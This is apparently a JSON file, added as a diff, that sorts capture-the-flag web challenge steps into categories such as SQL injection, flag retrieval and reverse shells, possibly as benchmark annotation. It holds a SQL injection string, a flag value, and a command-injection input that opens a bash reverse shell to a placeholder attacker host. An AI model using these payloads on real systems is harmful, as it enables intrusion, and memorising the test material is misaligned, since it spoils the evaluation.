@@ -1,0 +1,45 @@
+{
+    "SQL Injection": [
+        "Test the SQL injections '/api/call_api.php?api=10.0.42.200/?search=admin_richard_lauren'/**/OR/**/'1'='2'.",
+        "Fail to recognize the potential for using an SQL injection into the password field as an authentication bypass",
+        "Explored potential SQL Injection through string manipulation."
+    ],
+    "Flag Retrieval": [
+        "Repeat the process until the entire flag ('flag{4lly0Urb4s3}') is discovered.",
+        "Read and retrieve the flag from the displayed contents.",
+        "Used the 'flag' value on the '/com/seaerch/' endpoint.",
+        "Decoded the base64 encoded flag from the cookies"
+    ],
+    "Web Scraping & Automation": [
+        "Wrote a Python script to automate the requests"
+    ],
+    "Password Cracking": [
+        "Reveal the entire password"
+    ],
+    "Website Analysis": [
+        "Discover HTML comment",
+        "Observe the returned data.",
+        "Acknowledge the existence of 'magic hashes' that PHP considers equal",
+        "Observe the change in the URL after submitting a comment.",
+        "Reveal the source code of both `index.php` and `getimg.php`.",
+        "Examined how the OTP verification is performed.",
+        "Extract the understanding from the pull request."
+    ],
+    "Endpoint & Server Discovery": [
+        "Find the endpoint.",
+        "Perform an nmap scan on IP 18.213.16.123.",
+        "Enter the website URL in Dirb",
+        "Access the URL `https://xmas.2020.chall.actf.co/post`",
+        "Identify the presence of 'flag.txt' file in the parent directory."
+    ],
+    "Reverse Shell & Exploitation": [
+        "Input the payload to attempt to spawn a reverse shell.",
+        "Constructed a POST request to the '/flag' endpoint",
+        "Injected '127.0.0.1;bash -c bash -i >& /dev/tcp/<attack-ip-with-netcat-open>/<attacker-netcat-port> 0>&1'."
+    ],
+    "Information Gathering": [
+        "Observe the change in the URL after submitting a comment.",
+        "Identify the database containing 'bcrypt' hashes.",
+        "Locate the 'Host' header in the HTTP request."
+    ]
+}
